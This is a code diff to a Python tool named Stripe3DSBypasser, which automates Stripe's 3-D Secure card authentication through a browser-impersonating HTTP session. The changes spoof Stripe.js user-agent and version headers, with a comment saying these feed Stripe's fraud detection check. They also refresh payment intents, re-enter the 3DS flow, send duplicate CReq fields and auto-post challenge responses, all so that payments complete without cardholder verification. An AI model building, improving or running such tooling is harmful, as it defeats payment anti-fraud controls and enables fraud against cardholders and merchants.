@@ -12,7 +12,7 @@ import hashlib
 import random
 import asyncio
 from typing import Dict, Optional, Any
-from urllib.parse import urlencode
+from urllib.parse import urlencode, urljoin
 from curl_compat import ChromeSession
 
 UA = (
@@ -65,7 +65,6 @@ _CHALLENGE_MARKERS = (
     "challengeinfo",
     "verification code",
     "one time password",
-    "otp",
     "challengevar",
     'transstatus":"c"',
     "transstatus='c'",
@@ -74,6 +73,8 @@ _CHALLENGE_MARKERS = (
     "name='challengedata'",
     'id="challengeframe"',
     "id='challengeframe'",
+    'class="challenge',
+    "acs-challenge",
 )
 
 
@@ -111,11 +112,12 @@ def _html_challenge(html: str) -> bool:
     return bool(re.search(r'name=["\'](?:otp|passcode|code|token)["\']', html, re.I))
 
 
-def _parse_form(html: str):
+def _parse_form(html: str, base_url: str = ""):
     action = None
     m = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.I)
     if m:
-        action = m.group(1)
+        raw_action = m.group(1)
+        action = urljoin(base_url, raw_action) if base_url else raw_action
     fields = {}
     for tag in re.finditer(r"<input[^>]+>", html, re.I):
         t = tag.group(0)
@@ -467,11 +469,18 @@ class Stripe3DSBypasser:
         if browser_info.get("threeDSServerTransID"):
             auth_body["browser"]["threeDSServerTransID"] = browser_info["threeDSServerTransID"]
 
+        ua = (profile or {}).get("user_agent", UA)
+        auth_headers = cls._stripe_headers(profile, json_accept=True)
+        # payment_user_agent and Stripe-Version are part of Stripe's fraud detection check
+        auth_headers["User-Agent"] = f"{ua} {STRIPE_JS_UA}"
+        auth_headers["payment_user_agent"] = STRIPE_JS_UA
+        auth_headers["Stripe-Version"] = "2020-08-27"
+
         try:
             async with session.post(
                 "https://api.stripe.com/v1/3ds2/authenticate",
                 data=urlencode(_flatten(auth_body)),
-                headers=cls._stripe_headers(profile, json_accept=True),
+                headers=auth_headers,
                 timeout=14,
             ) as r:
                 d = await _json(r)
@@ -547,6 +556,33 @@ class Stripe3DSBypasser:
                 profile or {}, screen_w, screen_h, tz_offset, prim_lang,
             )
             await asyncio.sleep(1.5)
+            # Stripe parks the refreshed three_d_secure_2_source on the PI after method notify
+            # Must re-fetch before authenticate — original sdk blob may have empty source
+            if pi_id and client_secret:
+                endpoint = "setup_intents" if pi_id.startswith("seti_") else "payment_intents"
+                pi_url = f"https://api.stripe.com/v1/{endpoint}/{pi_id}?client_secret={client_secret}&key={pk_key}"
+                pi_hdr = cls._stripe_headers(profile, json_accept=True)
+                pi_hdr.pop("Content-Type", None)
+                try:
+                    async with session.get(pi_url, headers=pi_hdr, timeout=10) as pi_r:
+                        pi_fresh = await _json(pi_r)
+                    if isinstance(pi_fresh, dict):
+                        pi_obj = pi_fresh.get("payment_intent") or pi_fresh.get("setup_intent") or pi_fresh
+                        fresh_na = pi_obj.get("next_action") or {}
+                        fresh_sdk = cls._merge_sdk(fresh_na)
+                        if fresh_sdk:
+                            sdk_data = {**sdk_data, **fresh_sdk}
+                            # also update acs/creq from refreshed shape
+                            acs_url = sdk_data.get("acs_url") or acs_url
+                            creq = sdk_data.get("creq") or creq
+                            _ch2 = sdk_data.get("three_ds_2_challenge")
+                            session_data = (
+                                sdk_data.get("three_ds_session_data")
+                                or sdk_data.get("threeDSSessionData")
+                                or (_ch2.get("three_ds_session_data") if isinstance(_ch2, dict) else None)
+                            ) or session_data
+                except Exception as ex:
+                    print(f"[3DS] PI refresh after method error: {ex}")
 
         source_id = (
             cls._as_id(sdk_data.get("three_d_secure_2_source"))
@@ -601,7 +637,8 @@ class Stripe3DSBypasser:
     @classmethod
     async def _post_creq(cls, session, acs_url: str, creq: str,
                          session_data: str, profile: dict) -> Optional[dict]:
-        body = {"creq": creq}
+        # send both field name variants — EMVCo says "creq", some ACS implementations want "CReq"
+        body = {"creq": creq, "CReq": creq}
         if session_data:
             body["threeDSSessionData"] = session_data
         ua = (profile or {}).get("user_agent", UA)
@@ -630,7 +667,8 @@ class Stripe3DSBypasser:
             return {"success": False, "status": "requires_action", "challenge_required": True, "challenge_url": final_url}
 
         # frictionless ACS auto-posts CRes back to TermUrl / notification URL
-        c_url, c_data = _parse_form(html)
+        # pass final_url as base_url so relative form actions resolve correctly
+        c_url, c_data = _parse_form(html, base_url=final_url)
         if c_url and c_data:
             try:
                 async with session.post(
@@ -671,7 +709,7 @@ class Stripe3DSBypasser:
                 print(f"[3DS] challenge on landing {final_url}")
                 return {"success": False, "status": "requires_action", "challenge_required": True, "challenge_url": final_url}
 
-            acs_url, form_data = _parse_form(html)
+            acs_url, form_data = _parse_form(html, base_url=final_url)
             if not acs_url:
                 m_url = re.search(r'location\.href\s*=\s*["\']([^"\']+)["\']', html)
                 if m_url:
@@ -690,7 +728,7 @@ class Stripe3DSBypasser:
                     if _html_challenge(acs_html):
                         print(f"[3DS] interactive ACS {acs_final}")
                         return {"success": False, "status": "requires_action", "challenge_required": True, "challenge_url": acs_final}
-                    c_url, c_data = _parse_form(acs_html)
+                    c_url, c_data = _parse_form(acs_html, base_url=acs_final)
                     if c_url and c_data:
                         async with session.post(
                             c_url,
@@ -708,7 +746,8 @@ class Stripe3DSBypasser:
     @classmethod
     async def _check_pi_status(cls, session, pi_id: str,
                                client_secret: str, pk_key: str,
-                               profile: dict = None) -> Optional[dict]:
+                               profile: dict = None,
+                               _reenter: bool = True) -> Optional[dict]:
         if not pi_id or not client_secret:
             return None
         endpoint = "setup_intents" if pi_id.startswith("seti_") else "payment_intents"
@@ -741,6 +780,20 @@ class Stripe3DSBypasser:
                 print(f"[3DS] PI poll #{attempt + 1}: {ex}")
             if attempt < 5:
                 await asyncio.sleep(1.5)
+
+        # Poll exhausted — if still requires_action, re-enter 3DS handler once on updated next_action
+        if isinstance(last_d, dict) and last_d.get("status") == "requires_action" and _reenter:
+            pi_obj = last_d.get("payment_intent") or last_d.get("setup_intent") or last_d
+            updated_na = pi_obj.get("next_action") or last_d.get("next_action")
+            updated_cs = pi_obj.get("client_secret") or client_secret
+            if updated_na and isinstance(updated_na, dict):
+                act = updated_na.get("type", "")
+                if act == "redirect_to_url":
+                    red_url = (updated_na.get("redirect_to_url") or {}).get("url")
+                    return await cls._resolve_redirect_url(
+                        session, red_url, pi_id, updated_cs, pk_key, profile, depth=0)
+                return await cls._resolve_3ds2_sdk(
+                    session, updated_na, updated_cs, pk_key, profile, depth=0)
 
         if isinstance(last_d, dict):
             return {"success": False, "status": last_d.get("status", "unknown"), "raw_response": last_d}
@@ -796,7 +849,11 @@ class Stripe3DSBypasser:
                 outcome = None
 
                 sdk_type = sdk_block.get("type") or act_type
-                if sdk_type in ("stripe_3ds2_challenge", "three_ds_2_challenge") or sdk_block.get("acs_url") or sdk_block.get("creq"):
+                # Guard: only fire direct CReq path for explicit challenge types.
+                # Fingerprint blobs (stripe_3ds2_fingerprint, use_stripe_sdk) sometimes carry
+                # leftover acs_url keys — routing them here skips method and ACS returns C.
+                is_explicit_challenge = sdk_type in ("stripe_3ds2_challenge", "three_ds_2_challenge")
+                if is_explicit_challenge and (sdk_block.get("acs_url") or sdk_block.get("creq")):
                     acs_url = sdk_block.get("acs_url") or (sdk_block.get("three_ds_2_challenge") or {}).get("acs_url")
                     creq = sdk_block.get("creq") or (sdk_block.get("three_ds_2_challenge") or {}).get("creq")
                     sdata = sdk_block.get("three_ds_session_data") or sdk_block.get("threeDSSessionData") or ""
